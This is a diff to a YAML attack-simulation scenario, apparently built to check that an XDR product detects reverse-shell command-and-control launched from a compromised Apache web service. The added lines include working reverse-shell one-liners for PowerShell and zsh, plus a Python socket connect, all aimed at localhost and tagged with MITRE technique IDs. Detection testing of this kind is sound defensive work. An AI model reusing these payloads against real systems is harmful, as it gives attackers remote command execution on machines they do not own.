@@ -57,6 +57,17 @@ success_criteria: |
   validated against dataset=xdr_data.
 moat_tier: "LEAD"
 
+# ── Causality contract ──────────────────────────────────────────────────────
+# The compromised web service (apache2 / www-data) is the Causality Group Owner —
+# the initial-access process that OWNS the reverse-shell C2 chain in XDR's
+# causality view — NOT the synthetic beacon. Every reverse-shell method is
+# launched from that same web-shell lineage, so all five interpreters share one
+# causality_actor / causality_id (the CGO), and the multi-method sequence
+# collapses from a star-off-the-agent into one connected process_lineage spine.
+cgo_anchor:
+  image_name: "apache2"
+  primary_username: "www-data"
+
 external_tools:
   - name: Atomic Red Team
     source: "https://github.com/redcanaryco/atomic-red-team"
@@ -73,6 +84,10 @@ steps:
       echo '[*] Bash reverse shell simulation complete (connection refused expected)'
     identity: www-data
     mitre_technique: "T1059.004"
+    platforms: ["linux", "windows", "macos"]
+    platform_variants:
+      windows: "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$w=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($w,0,$w.Length)}\""
+      macos: "zsh -c 'zmodload zsh/net/tcp && ztcp 127.0.0.1 4444 && zsh -i <&$REPLY >&$REPLY 2>&$REPLY'"
     expected_detections:
       - plane: EDR
         type: BIOC
@@ -93,6 +108,12 @@ steps:
       echo '[*] Python reverse shell simulation complete'
     identity: www-data
     mitre_technique: "T1059.006"
+    platforms: ["linux", "windows"]
+    platform_variants:
+      windows: "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(3);s.connect(('127.0.0.1',4445));exit()\""
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
     expected_detections:
       - plane: EDR
         type: BIOC
@@ -115,6 +136,10 @@ steps:
       echo '[*] Netcat reverse shell simulation complete'
     identity: www-data
     mitre_technique: "T1059.004"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-02
+      pivot: process_lineage
     expected_detections:
       - plane: EDR
         type: BIOC
@@ -135,6 +160,10 @@ steps:
       echo '[*] Perl reverse shell simulation complete'
     identity: www-data
     mitre_technique: "T1059.004"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-03
+      pivot: process_lineage
     expected_detections:
       - plane: EDR
         type: BIOC
@@ -150,6 +179,10 @@ steps:
       echo '[*] OpenSSL reverse shell simulation complete — tests encrypted C2 detection'
     identity: www-data
     mitre_technique: "T1573.002"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-04
+      pivot: process_lineage
     expected_detections:
       - plane: EDR
         type: BIOC
